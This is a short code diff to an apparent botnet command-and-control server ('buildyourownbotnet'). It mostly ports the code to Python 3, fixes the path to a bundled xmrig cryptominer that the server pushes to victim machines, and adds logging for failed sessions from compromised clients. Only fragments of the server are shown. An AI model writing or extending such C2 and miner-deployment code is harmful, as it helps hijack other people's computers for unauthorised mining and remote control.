@@ -200,7 +200,7 @@ class C2(threading.Thread):
                 else:
                     platform = sys.platform
 
-                xmrig_path = os.path.abspath('modules/xmrig/xmrig_' + platform)
+                xmrig_path = os.path.abspath('buildyourownbotnet/modules/xmrig/xmrig_' + platform)
 
                 if sys.platform == 'win32':
                     os.rename(xmrig_path, xmrig_path + '.exe')
@@ -335,7 +335,7 @@ class C2(threading.Thread):
 
                 self.sessions[owner][session.info.get('uid')] = session
 
-                util.display('New session {}:{} connected'.format(owner, session.id))
+                util.display('New session {}:{} connected'.format(owner, session.info.get('uid')))
 
             else:
                 # util.display("\n\n[-]", color='red', style='bright', end=' ')
@@ -424,6 +424,7 @@ class SessionThread(threading.Thread):
             self.info = self.client_info()
             self.info['id'] = self.id
         except Exception as e:
+            util.log("Error creating session: {}".format(str(e)))
             self.info = None
 
 
@@ -474,8 +475,8 @@ class SessionThread(threading.Thread):
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
         for key, val in info.items():
-            if bytes(val).startswith(b"_b64"):
-                info[key] = base64.b64decode(bytes(val[6:])).decode('ascii')
+            if str(val).startswith("_b64"):
+                info[key] = base64.b64decode(val[6:]).decode('ascii')
         return info
 
 
@@ -528,9 +529,9 @@ class SessionThread(threading.Thread):
                 data = security.decrypt_aes(msg, self.key)
                 return json.loads(data)
             except Exception as e:
-                util.log("{0} error: {1}".format(self.recv_task.func_name, str(e)))
+                util.log("{0} error: {1}".format(self.recv_task.__name__, str(e)))
                 return {
-                    "uid": uuid.uuid4().get_hex(),
+                    "uid": uuid.uuid4().hex,
                     "session": self.info.get('uid'), 
                     "task": "", 
                     "result": "Error: client returned invalid response", 
